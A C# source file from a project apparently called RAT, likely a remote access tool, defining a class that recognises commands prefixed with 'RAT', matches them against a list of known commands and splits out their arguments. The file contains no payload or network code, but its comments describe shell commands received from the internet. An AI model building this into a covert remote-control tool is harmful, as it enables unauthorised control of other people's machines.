using RAT.src.Interfaces;
using RAT.src.Models.Enums;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;

namespace RAT.src.Logic.RatCommands
{
    /// <summary>
    /// Interpreter for rat commands.
    /// </summary>
    public class RatCommandInterpreter : IRatCommandInterpreter
    {
        /// <summary>
        /// Our command identifier, if this is found in our string command during receival as first word - then client wants
        /// to execute rat command.
        /// </summary>
        private const string _ratCommandIdentifier = "RAT";

        /// <summary>
        /// Holds all rat available commands.
        /// </summary>
        private List<string> _ratKnownCommands => Enum.GetNames(typeof(RatAvailableCommands)).ToList();

        /// <summary>
        /// Checks if command can be used by interpreter further, if it is defined in list of commands.
        /// </summary>
        /// <param name="command">Rat command.</param>
        /// <returns>Combination of check result and formatted command.</returns>
        public (bool, string) IsKnownRatCommand(string command)
        {
            if (!this.IsRatCommand(command))
            {
                return (false, string.Empty);
            }

            string cleanRatCommand = GetCleanCommandFromString(command); // "RAT some command -a args -b args2" => "some command"
            string stringToCompareWithEnums = cleanRatCommand.Replace(" ", string.Empty); // "some command" => "somecommand"

            string ratCommand = _ratKnownCommands.FirstOrDefault(x => x.ToLowerInvariant() == stringToCompareWithEnums);
            bool isKnownCommand = _ratKnownCommands.Any(x => x.ToLowerInvariant() == stringToCompareWithEnums);
            return isKnownCommand
                ? (true, ratCommand)
                : (false, string.Empty);
        }

        /// <summary>
        /// Determines if first word of string is command for rat.
        /// </summary>
        /// <param name="command">Command from internet i.e "cd .." for shell, or "dir", whatever.</param>
        /// <returns>True if command is rat command, false is something else.</returns>
        public bool IsRatCommand(string command)
        {
            // Check if first word of string is our command identifier.
            return Regex.Replace(command.Split()[0], @"[^0-9a-zA-Z\ ]+", "") == _ratCommandIdentifier;
        }

        /// <summary>
        /// Gets arguments that were provided with command.
        /// Taken from https://stackoverflow.com/questions/298830/split-string-containing-command-line-parameters-into-string-in-c-sharp
        /// </summary>
        /// <param name="command">Command in format "RAT some command -a arg1 -b arg2".</param>
        /// <returns>String converted to array of arguments with options.</returns>
        public string[] GetArgumentsForCommand(string command)
        {
            var parmChars = command.ToCharArray();
            var inSingleQuote = false;
            var inDoubleQuote = false;
            for (var index = 0; index < parmChars.Length; index++)
            {
                if (parmChars[index] == '"' && !inSingleQuote)
                {
                    inDoubleQuote = !inDoubleQuote;
                    parmChars[index] = '\n';
                }

                if (parmChars[index] == '\'' && !inDoubleQuote)
                {
                    inSingleQuote = !inSingleQuote;
                    parmChars[index] = '\n';
                }

                if (!inSingleQuote && !inDoubleQuote && parmChars[index] == ' ')
                {
                    parmChars[index] = '\n';
                }
            }

            return (new string(parmChars)).Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
        }

        /// <summary>
        /// Formats command from "RAT some command -a argument" to "some command" to get only clean command.
        /// </summary>
        /// <param name="command">Command to format.</param>
        /// <returns>Formatted command.</returns>
        private string GetCleanCommandFromString(string command)
        {
            // Get rid of \n in the end of command.
            if (command.LastIndexOf("\n") != -1)
            {
                command = command.Substring(0, command.LastIndexOf("\n"));
            }

            // Get rid of our identifier in the beginning
            int identifierLength = _ratCommandIdentifier.Length;
            command = command.Substring(identifierLength, command.Length - identifierLength).Trim();

            // Determine where first occurence of arguments begins.
            var indexOfFirstArgument = command.IndexOf(" -");
            if (indexOfFirstArgument == -1)
            {
                return command.Trim();
            }

            return command.Substring(0, indexOfFirstArgument).Trim();
        }
    }
}